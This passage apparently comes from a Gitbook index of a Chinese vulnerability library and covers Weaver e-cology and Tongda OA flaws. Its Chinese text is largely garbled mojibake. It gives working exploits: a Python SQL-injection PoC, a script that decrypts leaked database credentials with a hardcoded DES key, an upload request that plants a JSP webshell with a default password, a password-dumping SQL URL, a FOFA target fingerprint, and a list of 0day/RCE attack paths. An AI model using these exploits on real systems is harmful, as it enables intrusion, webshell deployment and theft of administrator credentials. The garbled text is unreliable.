ecology_JSessionId=abc49y8JvMcoqhSkCv02w; testBanCookie=test Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 ÊºèÊ¥ûÂà©Áî®POCF import requests import sys headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded' } def exploit(url): target=url+'/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333' payload=\"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1\" res=requests.post(url=target,data=payload,headers=headers,timeout=10) res.encoding=res.apparent_encoding print(res.text) if __name__ == '__main__': url=sys.argv[1] exploit(url) ÂèÇËÄÉÊñáÁ´† Ê≥õÂæÆOA WorkflowCenterTreeDataÊé•Âè£Ê≥®ÂÖ•Â§çÁé∞Ôºà‰ªÖÈôêoracleÊï∞ÊçÆÂ∫ìÔºâ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA e-cology Êï∞ÊçÆÂ∫ìÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÊºèÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA e-cology Êï∞ÊçÆÂ∫ìÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÊºèÊºèÊ¥û.html","title":"Ê≥õÂæÆOA e-cology Êï∞ÊçÆÂ∫ìÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÊºèÊºèÊ¥û","keywords":"","body":"Ê≥õÂæÆOA e-cology Êï∞ÊçÆÂ∫ìÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÊºèÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ 2019Âπ¥10Êúà24Êó•Ôºå360CERTÁõëÊµãÂà∞ÂèãÂïÜÂèëÂ∏É‰∫ÜÊ≥õÂæÆe-cology OAÊï∞ÊçÆÂ∫ìÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÊºèÊºèÊ¥ûÈ¢ÑË≠¶ÔºåÊºèÊ¥ûÁ≠âÁ∫ß‰∏≠„ÄÇ ÊîªÂáªËÄÖÂèØÈÄöËøáÂ≠òÂú®ÊºèÊ¥ûÁöÑÈ°µÈù¢Áõ¥Êé•Ëé∑ÂèñÂà∞Êï∞ÊçÆÂ∫ìÈÖçÁΩÆ‰ø°ÊÅØ„ÄÇÂ¶ÇÊûúÊîªÂáªËÄÖÂèØÁõ¥Êé•ËÆøÈóÆÊï∞ÊçÆÂ∫ìÔºåÂàôÂèØÁõ¥Êé•Ëé∑ÂèñÁî®Êà∑Êï∞ÊçÆÔºåÁîöËá≥ÂèØ‰ª•Áõ¥Êé•ÊéßÂà∂Êï∞ÊçÆÂ∫ìÊúçÂä°Âô®„ÄÇ 360CERTÂà§Êñ≠ÊºèÊ¥ûÁ≠âÁ∫ß‰∏∫‰∏≠ÔºåÂç±ÂÆ≥Èù¢/ÂΩ±ÂìçÈù¢‰Ωé„ÄÇÂª∫ËÆÆ‰ΩøÁî®Ê≥õÂæÆe-cology OAÁöÑÁî®Êà∑ÂèäÊó∂ÂÆâË£ÖÊúÄÊñ∞Ë°•‰∏ÅÔºå‰ª•ÂÖçÈÅ≠ÂèóÈªëÂÆ¢ÊîªÂáª„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] ÁõÆÂâçÂ∑≤Áü•‰∏∫8.100.0531,‰∏çÊéíÈô§ÂÖ∂‰ªñÁâàÊú¨ÔºåÂåÖÊã¨‰∏çÈôê‰∫éEC7.0„ÄÅEC8.0„ÄÅEC9.0Áâà ÊºèÊ¥ûÂ§çÁé∞ Ê†πÊçÆÊ∫êÁ†ÅÂèØ‰ª•ÂæóÂà∞DESÂØÜÈí•‰∏∫ 1z2x3c4v5b6nÔºà‰πüÊúâ1z2x3c4vÁöÑ,ÂèØ‰ª•ÊåâÊ≠§ËßÑÂæãÊù•ÁàÜÁ†¥Ôºâ ÂèØ‰ª•ÁúãÂà∞‰ºöÂ∞ÜÂΩìÂâçËøûÊé•Êï∞ÊçÆÂ∫ìÁöÑÁî®Êà∑ÂêçÂØÜÁ†ÅÔºåurlÔºålogintypeÁ≠â‰ø°ÊÅØËøõË°ådesÂä†ÂØÜÔºåÂπ∂ÊúÄÁªàËøõË°åËøîÂõûÔºåÂèØ‰ª•Áõ¥Êé•ÈÄöËøádesËß£ÂØÜËé∑ÂèñÊ≥ÑÈú≤‰ø°ÊÅØ„ÄÇ ÊºèÊ¥ûÂà©Áî®POC GithubÈìæÊé• python‰ª£Á†Å import base64 import requests import ast def req(url): headers = { 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', } r1 = requests.get(url,headers=headers).content s = r1.replace('\\r\\n','') res1 = base64.b64encode(s) postdata = { 'data':res1, 'type':'des', 'arg':'m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1' } u = 'http://tool.chacuo.net/cryptdes' r2 = requests.post(u,data=postdata,headers=headers).content res2 = ast.literal_eval(r2) return res2['data'] url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp' print req(url) ÂèÇËÄÉÊñáÁ´† [Êõ¥Êñ∞]Ê≥õÂæÆe-cology OAÊï∞ÊçÆÂ∫ìÈÖçÁΩÆ‰ø°ÊÅØÊ≥ÑÊºèÊºèÊ¥ûÈ¢ÑË≠¶ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA sysinterfacecodeEdit.jsp È°µÈù¢‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA sysinterfacecodeEdit.jsp È°µÈù¢‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html","title":"Ê≥õÂæÆOA sysinterfacecodeEdit.jsp È°µÈù¢‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†","keywords":"","body":"Ê≥õÂæÆOA sysinterface/codeEdit.jsp È°µÈù¢‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† WooYun-2015-0155705 ÊºèÊ¥ûÊèèËø∞ Ê≥õÂæÆOA sysinterface/codeEdit.jsp È°µÈù¢‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÂØºËá¥ÂèØ‰ª•‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂ ÊºèÊ¥ûÊèèËø∞ [!NOTE] ËæÉËÄÅÁâàÊú¨ÔºåÁõÆÂâçÊó†ÂáÜÁ°ÆÁâàÊú¨ ÊºèÊ¥ûÂ§çÁé∞ filename=******5308.java&filetype=javafilename‰∏∫Êñá‰ª∂ÂêçÁß∞ ‰∏∫Á©∫Êó∂‰ºöËá™Âä®ÂàõÂª∫‰∏Ä‰∏™ String fileid = \"Ewv\"; String readonly = \"\"; boolean isCreate = false; if(StringHelper.isEmpty(fileName)) { Date ndate = new Date(); SimpleDateFormat sf = new SimpleDateFormat(\"yyyyMMddHHmmss\"); String datetime = sf.format(ndate); fileid = fileid + datetime; fileName= fileid + \".\" + filetype; isCreate = true; } else { int pointIndex = fileName.indexOf(\".\"); if(pointIndex > -1) { fileid = fileName.substring(0,pointIndex); }} ÂèÇËÄÉÊñáÁ´† Ê≥õÂæÆOAÊú™ÊéàÊùÉÂèØÂØºËá¥GetShell Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA V9 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA V9 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html","title":"Ê≥õÂæÆOA V9 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†","keywords":"","body":"Ê≥õÂæÆOA V9 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† ÊºèÊ¥ûÊèèËø∞ Ê≥õÂæÆOA V9 Â≠òÂú®Êñá‰ª∂‰∏ä‰º†Êé•Âè£ÂØºËá¥‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ê≥õÂæÆOA V9 ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥û‰Ωç‰∫é: /page/exportImport/uploadOperation.jspÊñá‰ª∂‰∏≠ JspÊµÅÁ®ãÂ§ßÊ¶ÇÊòØ:Âà§Êñ≠ËØ∑Ê±ÇÊòØÂê¶ÊòØmultipartËØ∑Ê±Ç,ÁÑ∂Â∞±Ê≤°Êúâ‰∫Ü,Áõ¥Êé•‰∏ä‰º†‰∫Ü,ÂïäÂìàÂìàÂìàÂìàÂìà ÈáçÁÇπÂÖ≥Ê≥®File file=new File(savepath+filename), FilenameÂèÇÊï∞,ÊòØÂâçÂè∞ÂèØÊéßÁöÑ,Âπ∂‰∏îÊ≤°ÊúâÂÅö‰ªª‰ΩïËøáÊª§ÈôêÂà∂ Âà©Áî®ÈùûÂ∏∏ÁÆÄÂçï,Âè™Ë¶ÅÂØπÁùÄ 127.0.0.1/page/exportImport/uploadOperation.jsp Êù•‰∏Ä‰∏™multipartRequestÂ∞±ÂèØ‰ª•,Âà©Áî®ÁÆÄÂçï,Ëá™ËØÑÈ´òÂç±!! ÁÑ∂ÂêéËØ∑Ê±Ç ÁÑ∂ÂêéËØ∑Ê±ÇË∑ØÂæÑ: page/exportImport/fileTransfer/1.jsp ËØ∑Ê±ÇÂåÖ POST /page/exportImport/uploadOperation.jsp HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 397 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 dnt: 1 x-forwarded-for: 127.0.0.1 Connection: close ------WebKitFormBoundary6XgyjB6SeCArD3Hc Content-Disposition: form-data; name=\"file\"; filename=\"test.jsp\" Content-Type: application/octet-stream ------WebKitFormBoundary6XgyjB6SeCArD3Hc-- Âú∞ÂùÄ: /page/exportImport/fileTransfer/test.jsp ÈªòËÆ§ÂØÜÁ†Å rebeyond Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA V8 SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA V8 SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Ê≥õÂæÆOA V8 SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"Ê≥õÂæÆOA V8 SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Ê≥õÂæÆOA V8 Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÊºèÊ¥ûËé∑ÂèñÁÆ°ÁêÜÂëòÊùÉÈôêÂíåÊúçÂä°Âô®ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ê≥õÂæÆOA V8 FOFA [!NOTE] app=\"Ê≥õÂæÆ-ÂçèÂêåÂäûÂÖ¨OA\" ÊºèÊ¥ûÂ§çÁé∞ Âú®getdata.jsp‰∏≠ÔºåÁõ¥Êé•Â∞ÜrequestÂØπË±°‰∫§Áªô weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) : ÊñπÊ≥ïÂ§ÑÁêÜ Âú®getDataÊñπÊ≥ï‰∏≠ÔºåÂà§Êñ≠ËØ∑Ê±ÇÈáåcmdÂèÇÊï∞ÊòØÂê¶‰∏∫Á©∫ÔºåÂ¶ÇÊûú‰∏ç‰∏∫Á©∫ÔºåË∞ÉÁî®procÊñπÊ≥ï ProcÊñπÊ≥ï4‰∏™ÂèÇÊï∞Ôºå(‚ÄúÁ©∫Â≠óÁ¨¶‰∏≤‚Äù,‚ÄùcmdÂèÇÊï∞ÂÄº‚Äù,requestÂØπË±°ÔºåserverContextÂØπË±°) Âú®procÊñπÊ≥ï‰∏≠ÔºåÂØπcmdÂèÇÊï∞ÂÄºËøõË°åÂà§Êñ≠ÔºåÂΩìcmdÂÄºÁ≠â‰∫égetSelectAllIdÊó∂ÔºåÂÜç‰ªéËØ∑Ê±Ç‰∏≠Ëé∑ÂèñsqlÂíåtype‰∏§‰∏™ÂèÇÊï∞ÂÄºÔºåÂπ∂Â∞ÜÂèÇÊï∞‰º†ÈÄíËøõgetSelectAllIdsÔºàsql,typeÔºâÊñπÊ≥ï‰∏≠ Ê†πÊçÆ‰ª•‰∏ä‰ª£Á†ÅÊµÅÁ®ãÔºåÂè™Ë¶ÅÊûÑÈÄ†ËØ∑Ê±ÇÂèÇÊï∞ ?cmd= getSelectAllId&sql=select password as id from userinfo; Âç≥ÂèØÂÆåÊàêÂØπÊï∞ÊçÆÂ∫ìÊìçÊéß POC http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager Êü•ËØ¢HrmResourceManagerË°®‰∏≠ÁöÑpasswordÂ≠óÊÆµÔºåÈ°µÈù¢‰∏≠ËøîÂõû‰∫ÜÊï∞ÊçÆÂ∫ìÁ¨¨‰∏ÄÊù°ËÆ∞ÂΩïÁöÑÂÄºÔºàsysadminÁî®Êà∑ÁöÑpasswordÔºâ Ëß£ÂØÜÂêéÂç≥ÂèØÁôªÂΩïÁ≥ªÁªü Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Weaver OA 8 SQL injection Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/","title":"ÈÄöËææOA","keywords":"","body":"ÈÄöËææOA ÈÄöËææOAÈÉ®ÂàÜÊºèÊ¥û‰ø°ÊÅØÊï¥Âêà ÈÄöËææOA v11.2 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û ÈÄöËææOA v11.x-v11.5‰ªªÊÑèÁî®Êà∑ÁôªÂΩï ÈÄöËææOA v11.6 ‰ªªÊÑèÊñá‰ª∂Âà†Èô§&RCE ÈÄöËææOA v11.7ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û ÈÄöËææOA v11.7 Âú®Á∫øÁî®Êà∑ÁôªÂΩïÊºèÊ¥û ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´XSSÊºèÊ¥û ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOAÈÉ®ÂàÜÊºèÊ¥û‰ø°ÊÅØÊï¥Âêà.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOAÈÉ®ÂàÜÊºèÊ¥û‰ø°ÊÅØÊï¥Âêà.html","title":"ÈÄöËææOAÈÉ®ÂàÜÊºèÊ¥û‰ø°ÊÅØÊï¥Âêà","keywords":"","body":"ÈÄöËææOAÈÉ®ÂàÜÊºèÊ¥û‰ø°ÊÅØÊï¥Âêà ÈÄöËææOA‰ø°ÊÅØÊî∂ÈõÜ http[s]://TongDaOA.domain/inc/expired.php Âà§Êñ≠ÈÄöËææÁâàÊú¨ http[s]://TongDaOA.domain/inc/reg_trial.php http[s]://TongDaOA.domain/inc/reg_trial_submit.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php GET ÂèÇÊï∞username„ÄÅemail ÂèØÁàÜÁî®Êà∑„ÄÅÈÇÆÁÆ± http[s]://TongDaOA.domain/resque/worker.php ËÆ°ÁÆóÊú∫Âêç 2013-2017(SQLi path) http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php http[s]://TongDaOA.domain/module/crm2010/select/getData.php http[s]://TongDaOA.domain/module/crm2010/select/getValue.php http[s]://TongDaOA.domain/module/crm2010/select/index.php http[s]://TongDaOA.domain/module/crm2010/share/update.php http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID= http[s]://TongDaOA.domain/task/crm/account_care_remind.php http[s]://TongDaOA.domain/task/crm/action_link_remind.php http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php http[s]://TongDaOA.domain/task/crm/contract_near_remind.php http[s]://TongDaOA.domain/task/crm/contract_remind.php http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php http[s]://TongDaOA.domain/task/crm/payment_near_remind.php http[s]://TongDaOA.domain/task/crm/storage_near_remind.php http[s]://TongDaOA.domain/ispirit/myoa.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php v11~v11.6 [0day] http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php http[s]://TongDaOA.domain/general/reportshop/design/report/action.php http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php http[s]://TongDaOA.domain/interface/GetNewAPP.php http[s]://TongDaOA.domain/interface/GetNewAPP1.php http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php v11.6 [RCE] http[s]://TongDaOA.domain/module/appbuilder/assets/print.php 